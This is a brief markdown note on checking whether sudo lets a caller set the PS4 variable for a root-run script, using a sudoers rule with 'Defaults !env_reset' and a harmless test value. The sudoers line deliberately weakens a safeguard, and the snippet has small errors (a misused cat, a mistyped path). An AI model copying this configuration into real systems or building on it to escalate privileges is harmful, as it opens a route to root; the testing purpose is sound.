## sudo tests
* how to test
cat /opt/path/test.sh <<'EOF'
#!/bin/bash
echo "PS4: $PS4"
EOF
chmod +x /opt/patht/test.sh

# visudo
Defaults !env_reset
john ALL=(root) /opt/path/test.sh

$ sudo PS4=blah /opt/path/test.sh
PS4: blah # sudo is vuln

$ sudo PS4=blah /opt/path/test.sh
PS4: + # sudo is NOT vuln
